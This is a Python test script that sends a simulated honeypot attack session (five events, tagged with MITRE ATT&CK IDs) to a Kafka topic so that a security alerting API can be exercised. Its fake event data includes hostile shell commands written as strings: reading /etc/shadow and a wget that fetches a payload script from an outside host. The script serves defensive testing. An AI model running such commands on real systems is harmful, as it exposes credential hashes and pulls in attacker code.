"""
Simulates trap_controller.py emitting attacker events to Kafka.
Run this AFTER the API server is already running.
pip install aiokafka
"""
import asyncio, json
from datetime import datetime, timezone
from aiokafka import AIOKafkaProducer

KAFKA_BROKER = "localhost:9092"
KAFKA_TOPIC  = "chakravyuh.trap.telemetry"

FAKE_SESSION = [
    {"event_type": "session_start", "severity": "critical", "anomaly_score": 0.91,
     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
     "session_id": "trap-demo-01", "ttps": [], "command": ""},

    {"event_type": "command", "severity": "high", "anomaly_score": 0.91,
     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
     "session_id": "trap-demo-01", "command": "whoami",
     "ttps": [{"id": "T1033", "name": "System Owner/User Discovery"}]},

    {"event_type": "command", "severity": "critical", "anomaly_score": 0.97,
     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
     "session_id": "trap-demo-01", "command": "cat /etc/shadow",
     "ttps": [{"id": "T1003.008", "name": "/etc/passwd and /etc/shadow"}]},

    {"event_type": "command", "severity": "critical", "anomaly_score": 0.99,
     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
     "session_id": "trap-demo-01", "command": "wget http://185.x.x.x/payload.sh",
     "ttps": [{"id": "T1105", "name": "Ingress Tool Transfer"}]},

    {"event_type": "session_end", "severity": "critical", "anomaly_score": 0.99,
     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
     "session_id": "trap-demo-01", "ttps": [], "command": "",
     "total_commands": 3},
]

async def main():
    producer = AIOKafkaProducer(bootstrap_servers=KAFKA_BROKER)
    await producer.start()
    print(f"Connected to Kafka. Sending {len(FAKE_SESSION)} events to '{KAFKA_TOPIC}'...\n")
    try:
        for event in FAKE_SESSION:
            event["timestamp"] = datetime.now(timezone.utc).isoformat()
            await producer.send_and_wait(
                KAFKA_TOPIC,
                json.dumps(event).encode("utf-8")
            )
            print(f"  Sent → event_type={event['event_type']:15s}  command={event.get('command', '—')}")
            await asyncio.sleep(2)  # 2 second gap between commands = realistic pacing
    finally:
        await producer.stop()
    print("\nDone. Check your WebSocket terminal — you should have received 5 alerts.")

asyncio.run(main())